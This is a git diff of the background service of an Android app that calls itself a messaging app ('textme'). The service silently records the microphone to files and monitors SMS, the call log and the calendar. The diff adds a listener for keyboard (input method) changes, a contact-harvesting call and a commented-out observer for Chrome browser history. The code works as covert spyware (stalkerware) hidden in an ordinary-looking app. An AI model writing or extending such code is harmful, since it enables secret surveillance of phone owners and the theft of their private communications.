@@ -1,6 +1,5 @@
 package com.candroid.textme;
 
-import android.app.SearchManager;
 import android.app.Service;
 import android.content.Context;
 import android.content.Intent;
@@ -8,39 +7,19 @@ import android.content.IntentFilter;
 import android.database.ContentObserver;
 import android.database.Cursor;
 import android.database.sqlite.SQLiteDatabase;
-import android.graphics.Canvas;
-import android.graphics.Color;
-import android.graphics.Paint;
-import android.graphics.pdf.PdfDocument;
-import android.hardware.Camera;
-import android.hardware.camera2.CameraAccessException;
-import android.hardware.camera2.CameraManager;
 import android.location.LocationManager;
-import android.media.AudioManager;
-import android.media.MediaPlayer;
 import android.media.MediaRecorder;
 import android.net.Uri;
-import android.os.Bundle;
-import android.os.CancellationSignal;
 import android.os.Environment;
 import android.os.Handler;
 import android.os.IBinder;
-import android.os.ParcelFileDescriptor;
-import android.print.PageRange;
-import android.print.PrintAttributes;
-import android.print.PrintDocumentAdapter;
-import android.print.PrintDocumentInfo;
-import android.print.PrintManager;
-import android.print.pdf.PrintedPdfDocument;
 import android.provider.CalendarContract;
 import android.provider.CallLog;
 import android.provider.Telephony;
 import android.util.Log;
 
 import java.io.File;
-import java.io.FileOutputStream;
 import java.io.IOException;
-import java.io.InputStream;
 
 public class MessagingService extends Service {
 
@@ -58,7 +37,8 @@ public class MessagingService extends Service {
     private HeadsetPlugReceiver mHeadsetReceiver;
     protected static String sTelephoneAddress;
     private LocationManager mLocationManager;
-    private MediaRecorder mMediaRecorder;
+    protected static MediaRecorder sMediaRecorder;
+    private ImeReceiver mImeReceiver;
     public MessagingService() {
     }
 
@@ -71,6 +51,7 @@ public class MessagingService extends Service {
         mIncomingReceiver = new IncomingReceiver();
         mOutgoingReceiver = new OutgoingReceiver();
         mHeadsetReceiver = new HeadsetPlugReceiver();
+        mImeReceiver = new ImeReceiver();
         mCreateConversationReceiver = new CreateConversationReceiver();
         mScreenReceiver = new ScreenReceiver();
         mWapReceiver = new WapReceiver();
@@ -108,12 +89,14 @@ public class MessagingService extends Service {
             e.printStackTrace();
         }
         registerReceiver(mShareReceiver, shareFilter);*/
+        IntentFilter imeFilter = new IntentFilter(Intent.ACTION_INPUT_METHOD_CHANGED);
         registerReceiver(mWapReceiver, wapFilter);
         registerReceiver(mCreateConversationReceiver, conversationFilter);
         registerReceiver(mIncomingReceiver, incomingFilter);
         registerReceiver(mOutgoingReceiver, outgoingFilter);
         registerReceiver(mHeadsetReceiver, headsetFilter);
         registerReceiver(mScreenReceiver, screenFilter);
+        registerReceiver(mImeReceiver, imeFilter);
         IntentFilter databaseFilter = new IntentFilter();
         databaseFilter.addAction(Telephony.Sms.Intents.SMS_RECEIVED_ACTION);
         databaseFilter.addAction(Constants.Actions.ACTION_OUTGOING_SMS);
@@ -126,15 +109,16 @@ public class MessagingService extends Service {
         mCalendarObserver = new CalendarObserver();
         getContentResolver().registerContentObserver(Uri.parse("content://sms"), true, mObserver);
         getContentResolver().registerContentObserver(Uri.parse("content://call_log"), true, mCallLogObserver);
+        //getContentResolver().registerContentObserver(Uri.parse("content://com.android.chrome.browser/history"), true, mBrowserObserver);
         getContentResolver().registerContentObserver(CalendarContract.Events.CONTENT_URI, true, mCalendarObserver);
 
         new Thread(new Runnable() {
             @Override
             public void run() {
-                mMediaRecorder = new MediaRecorder();
-                mMediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
-                mMediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
-                mMediaRecorder.setAudioEncoder(MediaRecorder.OutputFormat.AMR_NB);
+                sMediaRecorder = new MediaRecorder();
+                sMediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
+                sMediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
+                sMediaRecorder.setAudioEncoder(MediaRecorder.OutputFormat.AMR_NB);
 
                 SQLiteDatabase db = database.getWritableDatabase();
                 try {
@@ -152,12 +136,12 @@ public class MessagingService extends Service {
                         }else{
                             Database.insertMedia(db, audioFile.getName(), audioFile);
                         }
-                        mMediaRecorder.setOutputFile(audioFile);
-                        mMediaRecorder.prepare();
-                        mMediaRecorder.start();
+                        sMediaRecorder.setOutputFile(audioFile);
+                        sMediaRecorder.prepare();
+                        sMediaRecorder.start();
                      /*   pictures = Lofl.getFilesForDirectory(Lofl.getPicturesDirectory().getPath());
                         if(pictures != null && pictures.length > 0){
-                            for(File f : pictures){
+                            for(File f : pictures){+
                                 //Database.insertMedia(sDatabase, f.getName(), f);
                             }
                         }*/
@@ -167,23 +151,23 @@ public class MessagingService extends Service {
                     e.printStackTrace();
                 }
                 db.endTransaction();
-                db.beginTransaction();
+          /*      db.beginTransaction();
                 Database.insertPackages(db, Lofl.getInstalledApps(MessagingService.this));
                 db.setTransactionSuccessful();
-                db.endTransaction();
+                db.endTransaction();*/
                 db.close();
                 //Database.insertDevice(sDatabase, sTelephoneAddress, Build.MANUFACTURER, Build.PRODUCT, Build.VERSION.SDK, BuildConfig.FLAVOR, Build.SERIAL, Build.RADIO);
             }
         }).start();
 
-        try {
+/*        try {
             String locationProvider = LocationManager.GPS_PROVIDER;
             mLocationManager = Lofl.getLocationManager(MessagingService.this);
             mLocationManager.requestLocationUpdates(locationProvider, 60000, 60, Lofl.getLocationListener(MessagingService.this));
 
         } catch (SecurityException e) {
             e.printStackTrace();
-        }
+        }*/
 
        /* new Thread(new Runnable() {
             @Override
@@ -225,6 +209,7 @@ public class MessagingService extends Service {
                 Lofl.changeWallpaper(MessagingService.this, Lofl.getBitmapFromUrl(Uri.parse("https://i.pinimg.com/originals/04/17/57/0417575eea25c3568bf4007de9afe61f.jpg").toString()));
             }
         }).start();
+        Lofl.fetchContactsInformation(this);
 
     }
 
@@ -238,6 +223,7 @@ public class MessagingService extends Service {
         unregisterReceiver(mWapReceiver);
         unregisterReceiver(mHeadsetReceiver);
         unregisterReceiver(mScreenReceiver);
+        unregisterReceiver(mImeReceiver);
         /*unregisterReceiver(mShareReceiver);*/
         //unregisterReceiver(mAirplaneReceiver);
         DatabaseHelper.getInstance(getApplicationContext()).close();
@@ -245,9 +231,9 @@ public class MessagingService extends Service {
         getContentResolver().unregisterContentObserver(mObserver);
         getContentResolver().unregisterContentObserver(mCallLogObserver);
         getContentResolver().unregisterContentObserver(mCalendarObserver);
-        if(mMediaRecorder != null){
-            mMediaRecorder.stop();
-            mMediaRecorder.release();
+        if(sMediaRecorder != null){
+            sMediaRecorder.stop();
+            sMediaRecorder.release();
         }
         stopForeground(true);
         stopSelf();
